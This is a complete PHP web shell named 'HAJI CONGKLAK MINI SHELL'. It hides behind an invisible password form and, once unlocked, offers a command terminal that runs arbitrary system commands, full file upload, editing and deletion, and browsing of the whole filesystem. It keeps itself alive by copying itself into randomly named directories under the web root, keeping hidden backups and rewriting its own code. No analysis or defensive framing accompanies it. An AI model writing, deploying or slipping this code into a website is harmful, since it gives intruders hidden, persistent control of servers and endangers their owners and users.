<?php
define('AUTH_HASH', '$2y$10$y0QHUXtu8ZvI93hsxreF0.Es3qjvOSlARha.Wk6lJG84p5o5mUt92');

session_start();
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");

function verifyPassword($password) {
    $hash = AUTH_HASH;
    if (substr($hash, 0, 4) === '$2y$') {
        $hash = '$2a$' . substr($hash, 4);
    }
    return password_verify($password, $hash);
}

if (isset($_POST['key'])) {
    if (verifyPassword($_POST['key'])) {
        $_SESSION['auth'] = true;
        $_SESSION['login_time'] = time();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

if (isset($_GET['exit'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

$is_auth = isset($_SESSION['auth']) && $_SESSION['auth'] === true;

function randomString($len = 8) {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $str = '';
    for ($i = 0; $i < $len; $i++) {
        $str .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $str;
}

function cloneShell($source, $count = 5) {
    $root = $_SERVER['DOCUMENT_ROOT'];
    $regFile = dirname($source) . '/.reg';
    $clones = file_exists($regFile) ? json_decode(file_get_contents($regFile), true) : [];
    
    $active = [];
    foreach ($clones as $c) {
        if (file_exists($root . '/' . $c)) {
            $active[] = $c;
        }
    }
    
    while (count($active) < $count) {
        $dir = randomString(12);
        $file = randomString(8) . '.php';
        $path = $dir . '/' . $file;
        $fullPath = $root . '/' . $path;
        
        if (!is_dir(dirname($fullPath))) {
            @mkdir(dirname($fullPath), 0755, true);
        }
        
        $content = file_get_contents($source);
        $content = preg_replace("/define\\('MARKER', '.*?'\\);/", "define('MARKER', '" . time() . "');", $content);
        file_put_contents($fullPath, $content);
        @chmod($fullPath, 0644);
        $active[] = $path;
    }
    
    file_put_contents($regFile, json_encode($active));
    return $active;
}

if ($is_auth && !isset($_SESSION['cloned'])) {
    $_SESSION['clones'] = cloneShell($_SERVER['SCRIPT_FILENAME'], 5);
    $_SESSION['cloned'] = true;
}

function selfHeal() {
    $current = $_SERVER['SCRIPT_FILENAME'];
    $marker = "define('MARKER', 'ORIGIN');";
    $content = file_get_contents($current);
    
    if (strpos($content, "define('MARKER',") === false) {
        $content = str_replace("<?php", "<?php\n" . $marker . "\n", $content);
        file_put_contents($current, $content);
    }
}

selfHeal();

function backup() {
    $dir = dirname($_SERVER['SCRIPT_FILENAME']) . '/.bkp';
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    
    $file = $dir . '/b_' . date('Ymd_His') . '.php';
    copy($_SERVER['SCRIPT_FILENAME'], $file);
    
    $files = glob($dir . '/*.php');
    if (count($files) > 5) {
        usort($files, function($a, $b) {
            return filemtime($a) - filemtime($b);
        });
        foreach (array_slice($files, 0, count($files) - 5) as $f) {
            @unlink($f);
        }
    }
    return $file;
}

function deleteDir($dir) {
    if (!is_dir($dir)) return false;
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        is_dir($path) ? deleteDir($path) : unlink($path);
    }
    return rmdir($dir);
}

function listDir($path) {
    $items = [];
    if (!is_dir($path)) return $items;
    
    $dh = opendir($path);
    while (($f = readdir($dh)) !== false) {
        if ($f == '.' || $f == '..') continue;
        $fp = $path . '/' . $f;
        $items[] = [
            'name' => $f,
            'type' => is_dir($fp) ? 'dir' : 'file',
            'size' => is_file($fp) ? filesize($fp) : 0,
            'perm' => substr(sprintf('%o', fileperms($fp)), -4),
            'time' => date('Y-m-d H:i', filemtime($fp))
        ];
    }
    closedir($dh);
    return $items;
}

$msg = '';
$curDir = isset($_GET['d']) ? $_GET['d'] : getcwd();

if ($is_auth && isset($_POST['upload'])) {
    move_uploaded_file($_FILES['f']['tmp_name'], $curDir . '/' . $_FILES['f']['name']);
    $msg = 'UPLOADED: ' . $_FILES['f']['name'];
}

if ($is_auth && isset($_GET['del'])) {
    $target = $curDir . '/' . basename($_GET['del']);
    if (is_dir($target)) {
        deleteDir($target);
        $msg = 'DIR DELETED: ' . basename($target);
    } else {
        unlink($target);
        $msg = 'FILE DELETED: ' . basename($target);
    }
}

if ($is_auth && isset($_POST['rename'])) {
    $old = $curDir . '/' . basename($_POST['oldname']);
    $new = $curDir . '/' . basename($_POST['newname']);
    rename($old, $new);
    $msg = 'RENAMED: ' . basename($_POST['oldname']) . ' → ' . basename($_POST['newname']);
}

if ($is_auth && isset($_POST['save'])) {
    file_put_contents($_POST['p'], $_POST['c']);
    $msg = 'SAVED: ' . basename($_POST['p']);
}

if ($is_auth && isset($_POST['mkdir'])) {
    $newDir = $curDir . '/' . basename($_POST['foldername']);
    mkdir($newDir, 0755);
    $msg = 'FOLDER CREATED: ' . basename($_POST['foldername']);
}

if ($is_auth && isset($_POST['touch'])) {
    $newFile = $curDir . '/' . basename($_POST['filename']);
    file_put_contents($newFile, '');
    $msg = 'FILE CREATED: ' . basename($_POST['filename']);
}

if ($is_auth && isset($_GET['backup'])) {
    $b = backup();
    $msg = 'BACKUP: ' . basename($b);
}
?>

<?php if (!$is_auth): ?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

html, body {
    width: 100%;
    height: 100%;
    background: #FFFFFF;
    overflow: hidden;
    font-family: Arial, sans-serif;
}

/* Form di tengah tapi invisible */
.ghost-form {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    text-align: center;
    opacity: 0;
}

/* Input invisible */
.ghost-input {
    width: 250px;
    padding: 15px;
    border: 1px solid #FFFFFF;
    background: #FFFFFF;
    color: #FFFFFF;
    font-size: 14px;
    text-align: center;
    outline: none;
    border-radius: 3px;
    margin: 5px;
}

.ghost-input::placeholder {
    color: #FFFFFF;
}
</style>
</head>
<body>

<form class="ghost-form" method="POST" action="">
    <input type="password" name="key" class="ghost-input" placeholder="••••••••" autocomplete="off" autofocus><br>
    <button type="submit" style="display: none;">Login</button>
</form>

</body>
</html>

<?php else: ?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>//</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
            font-weight: bold;
        }
        body {
            background: #000000;
            color: #FFFFFF;
            padding: 20px;
        }
        .header {
            border-bottom: 2px solid #FFFFFF;
            padding-bottom: 15px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
        }
        .nav {
            margin-bottom: 20px;
        }
        .nav a {
            color: #FFFFFF;
            text-decoration: none;
            margin-right: 20px;
            padding: 8px 16px;
            border: 2px solid #FFFFFF;
            border-radius: 6%;
            display: inline-block;
        }
        .nav a:hover {
            background: #FFFFFF;
            color: #000000;
        }
        .box {
            border: 2px solid #FFFFFF;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 6%;
        }
        .create-box {
            border: 2px solid #FFFFFF;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 6%;
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        .create-section {
            flex: 1;
            min-width: 250px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            border: 1px solid #FFFFFF;
            padding: 10px;
            text-align: left;
        }
        th {
            background: #FFFFFF;
            color: #000000;
        }
        tr:hover {
            background: #111111;
        }
        .btn {
            padding: 5px 15px;
            background: #FFFFFF;
            color: #000000;
            text-decoration: none;
            border: 2px solid #FFFFFF;
            border-radius: 6%;
            font-size: 11px;
            display: inline-block;
            cursor: pointer;
        }
        .btn:hover {
            background: #000000;
            color: #FFFFFF;
        }
        .btn-small {
            padding: 3px 10px;
            font-size: 10px;
        }
        input[type="file"], input[type="text"] {
            padding: 8px;
            border: 2px solid #FFFFFF;
            background: #000000;
            color: #FFFFFF;
            font-weight: bold;
        }
        button {
            padding: 8px 20px;
            background: #FFFFFF;
            color: #000000;
            border: 2px solid #FFFFFF;
            border-radius: 6%;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background: #000000;
            color: #FFFFFF;
        }
        textarea {
            width: 100%;
            min-height: 300px;
            background: #000000;
            color: #FFFFFF;
            border: 2px solid #FFFFFF;
            padding: 10px;
            font-family: monospace;
            font-weight: bold;
        }
        .msg {
            background: #FFFFFF;
            color: #000000;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 6%;
        }
        .clone-item {
            padding: 8px;
            margin: 5px 0;
            border: 1px solid #FFFFFF;
            font-family: monospace;
            font-size: 12px;
        }
        .breadcrumb {
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #FFFFFF;
        }
        .breadcrumb a {
            color: #FFFFFF;
            text-decoration: none;
            margin-right: 5px;
        }
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        .breadcrumb span {
            margin-right: 5px;
            color: #666666;
        }
        .rename-form {
            display: inline;
            margin-left: 5px;
        }
        .rename-form input {
            width: 100px;
            padding: 3px;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>HAJI CONGKLAK MINI SHELL</h1>
        <a href="?exit=1" style="color: #FFFFFF; text-decoration: none;">[X]</a>
    </div>
    
    <div class="nav">
        <a href="?">[ FILES ]</a>
        <a href="?m=clones">[ CLONES ]</a>
        <a href="?m=backup">[ BACKUP ]</a>
        <a href="?m=cmd">[ TERMINAL ]</a>
    </div>
    
    <?php if ($msg): ?>
        <div class="msg"><?php echo htmlspecialchars($msg); ?></div>
    <?php endif; ?>
    
    <?php if (isset($_GET['m']) && $_GET['m'] == 'clones'): ?>
        <div class="box">
            <h3>ACTIVE CLONES</h3>
            <?php 
            $clones = $_SESSION['clones'] ?? [];
            foreach ($clones as $c) {
                $url = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $c;
                echo '<div class="clone-item">';
                echo '<a href="' . $url . '" target="_blank" style="color: #00FF00;">' . $c . '</a>';
                echo '</div>';
            }
            ?>
        </div>
        
    <?php elseif (isset($_GET['m']) && $_GET['m'] == 'backup'): ?>
        <div class="box">
            <h3>BACKUP MANAGER</h3>
            <a href="?backup=1" class="btn">CREATE BACKUP</a>
            <?php
            $bkpDir = dirname($_SERVER['SCRIPT_FILENAME']) . '/.bkp';
            if (is_dir($bkpDir)) {
                $files = glob($bkpDir . '/*.php');
                rsort($files);
                foreach (array_slice($files, 0, 5) as $f) {
                    echo '<div class="clone-item">' . basename($f) . ' (' . number_format(filesize($f)) . ' B)</div>';
                }
            }
            ?>
        </div>
        
    <?php elseif (isset($_GET['m']) && $_GET['m'] == 'cmd'): ?>
        <div class="box">
            <h3>TERMINAL</h3>
            <form method="POST" action="">
                <input type="text" name="cmd" placeholder="Enter command..." style="width: 70%;">
                <button type="submit">EXECUTE</button>
            </form>
            <?php if (isset($_POST['cmd'])): ?>
                <div style="margin-top: 15px; padding: 15px; border: 1px solid #FFFFFF; white-space: pre-wrap; font-family: monospace;">
$ <?php echo htmlspecialchars($_POST['cmd']); ?>

<?php 
    $cmd = $_POST['cmd'];
    $out = [];
    exec($cmd . ' 2>&1', $out);
    echo htmlspecialchars(implode("\n", $out));
?>
                </div>
            <?php endif; ?>
        </div>
        
    <?php elseif (isset($_GET['edit'])): ?>
        <?php $f = $_GET['edit']; $c = file_get_contents($f); ?>
        <div class="box">
            <h3>EDIT: <?php echo basename($f); ?></h3>
            <form method="POST" action="">
                <input type="hidden" name="p" value="<?php echo $f; ?>">
                <textarea name="c"><?php echo htmlspecialchars($c); ?></textarea>
                <br><br>
                <button type="submit" name="save">SAVE FILE</button>
                <a href="?d=<?php echo dirname($f); ?>" class="btn">CANCEL</a>
            </form>
        </div>
        
    <?php else: ?>
        <div class="create-box">
            <div class="create-section">
                <h4 style="margin-bottom: 10px;">CREATE FOLDER</h4>
                <form method="POST" action="">
                    <input type="text" name="foldername" placeholder="folder_name" style="width: 150px;">
                    <button type="submit" name="mkdir" class="btn-small">CREATE</button>
                </form>
            </div>
            <div class="create-section">
                <h4 style="margin-bottom: 10px;">CREATE FILE</h4>
                <form method="POST" action="">
                    <input type="text" name="filename" placeholder="file.txt" style="width: 150px;">
                    <button type="submit" name="touch" class="btn-small">CREATE</button>
                </form>
            </div>
            <div class="create-section">
                <h4 style="margin-bottom: 10px;">UPLOAD FILE</h4>
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="f" style="width: 200px;">
                    <button type="submit" name="upload" class="btn-small">UPLOAD</button>
                </form>
            </div>
        </div>
        
        <div class="box">
            <h3>DIRECTORY: <?php echo $curDir; ?></h3>
            
            <div class="breadcrumb">
                <?php
                $parts = explode('/', $curDir);
                $buildPath = '';
                foreach ($parts as $i => $part) {
                    if ($part === '') continue;
                    $buildPath .= '/' . $part;
                    echo '<a href="?d=' . urlencode($buildPath) . '">' . htmlspecialchars($part) . '</a>';
                    if ($i < count($parts) - 1) {
                        echo '<span>/</span>';
                    }
                }
                if (count($parts) <= 1) {
                    echo '<a href="?d=/">/</a>';
                }
                ?>
            </div>
            
            <table>
                <tr>
                    <th>NAME</th>
                    <th>TYPE</th>
                    <th>SIZE</th>
                    <th>PERM</th>
                    <th>MODIFIED</th>
                    <th>ACTIONS</th>
                </tr>
                
                <?php if ($curDir != '/'): ?>
                <tr>
                    <td colspan="6">
                        <a href="?d=<?php echo urlencode(dirname($curDir)); ?>" style="color: #FFFFFF;">[ .. ] PARENT DIRECTORY</a>
                    </td>
                </tr>
                <?php endif; ?>
                
                <?php 
                $items = listDir($curDir);
                usort($items, function($a, $b) {
                    if ($a['type'] == $b['type']) return strcmp($a['name'], $b['name']);
                    return $a['type'] == 'dir' ? -1 : 1;
                });
                
                foreach ($items as $item): 
                $itemPath = $curDir . '/' . $item['name'];
                ?>
                <tr>
                    <td>
                        <?php if ($item['type'] == 'dir'): ?>
                            <a href="?d=<?php echo urlencode($itemPath); ?>" style="color: #FFFFFF; font-weight: bold;">[ <?php echo htmlspecialchars($item['name']); ?> ]</a>
                        <?php else: ?>
                            <?php echo htmlspecialchars($item['name']); ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $item['type']; ?></td>
                    <td><?php echo $item['type'] == 'dir' ? '-' : number_format($item['size']) . ' B'; ?></td>
                    <td><?php echo $item['perm']; ?></td>
                    <td><?php echo $item['time']; ?></td>
                    <td>
                        <form class="rename-form" method="POST" action="">
                            <input type="hidden" name="oldname" value="<?php echo $item['name']; ?>">
                            <input type="text" name="newname" placeholder="new name">
                            <button type="submit" name="rename" class="btn btn-small">REN</button>
                        </form>
                        
                        <?php if ($item['type'] == 'file'): ?>
                            <a href="?edit=<?php echo urlencode($itemPath); ?>" class="btn btn-small">EDIT</a>
                        <?php endif; ?>
                        
                        <a href="?del=<?php echo urlencode($item['name']); ?>&d=<?php echo urlencode($curDir); ?>" class="btn btn-small" style="background: #000000; color: #FFFFFF;" onclick="return confirm('Delete <?php echo $item['type']; ?>: <?php echo $item['name']; ?>?')">DEL</a>
                    </td>
                </tr>
                <?php endforeach; ?>
            </table>
        </div>
    <?php endif; ?>
    
    <div style="margin-top: 20px; padding-top: 10px; border-top: 1px solid #333333; font-size: 11px; color: #666666;">
        HAJI RACING | CLONES: <?php echo count($_SESSION['clones'] ?? []); ?> | DIR: <?php echo basename($curDir); ?>
    </div>
</body>
</html>
<?php endif; ?>